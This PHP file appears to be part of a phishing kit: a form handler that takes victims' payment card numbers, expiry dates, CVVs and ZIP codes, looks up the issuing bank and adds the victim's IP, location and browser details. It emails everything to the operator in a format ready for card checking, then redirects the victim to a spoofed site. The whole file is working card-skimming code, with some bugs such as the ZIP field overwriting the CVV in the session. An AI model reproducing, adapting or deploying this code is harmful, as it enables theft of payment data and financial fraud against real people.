<?php
require_once("../main.php");
require_once("../tele3.php");
if(!empty($_POST['card']) && !empty($_POST['month'])){ if(!empty($_POST['year']) && !empty($_POST['cvv'])){
    
$_SESSION['card'] = $_POST['card'];
$_SESSION['month'] = $_POST['month'];
$_SESSION['year'] = $_POST['year'];
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['cvv'] = $_POST['zip'];
$_SESSION['page']['card'] 			= true;
}
$bin = check_bin($_POST['card']);
$type = $_SESSION['type'] = strtoupper($bin["type"]);
$brand = $_SESSION['brand'] = strtoupper($bin["brand"]);
$bank = $_SESSION['bank'] = strtoupper($bin["bank"]["name"]);
$bins = preg_replace('/\s/', '', $_POST['card']);
$bins = substr($bins,0,6);
list($month, $year) = explode("/", $_POST['exp']);

    $message .= "Bank 		 : ".$bin["bank"]["name"]."\n";
    $message .= "Type 		 : ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
    $message = "               
                #---------------------[ NORTHLANE CARD 💰💲 ]-------------------------#
                 CARD : ".$_POST['card']." 
                 EXP: ".$_POST['month']." / ".$_POST['year']."
                 CVV : ".$_POST['cvv']."
                 ZIPCODE : ".$_POST['zip']."
                For Check💲 ".$_POST['card']."|".$_POST['cvv']."|
	            #-------------------[ DEVICE INFORMATION ]--------------------#
                IP Address  : ".$ip."
                ISP		    : ".$ispuser."
                Region		: ".$regioncity."
                City		: ".$citykota."
                GMT         : ".$continent."
                Timezone	: ".$timezone."
                OS/Browser	: ".$os." / ".$br."
                Date		: ".$date."
                User Agent	: ".$user_agent."
                #----------------[ SEMANGATTBOSKU ]----------------#";
                  $bins = preg_replace('/\s/', '', $_POST['creditCardNumber']);
                  $bins = substr($bins,0,6);
                  $from = $setting['sender_mail'];
                  $to = $setting['email_result'];
                  $headers = "From: HYROESZEGA <".$from.">";
                  if($bin["brand"] == "") {
		          $subject = "NORTHLANE CARD : [".$bins."]  - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." [$cn - $ip]";
                  $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
                 }else{
		         $subject = "NORTHLANE CARD : 💰💲[".$bins."]  - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." [$cn - $ip]";
                 $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
                 }
                 mail($to, $subject, $message, $headers);
                  
              

   echo "<script type='text/javascript'>window.top.location='../../../MyRCL/';</script>";
   
    }
    

?>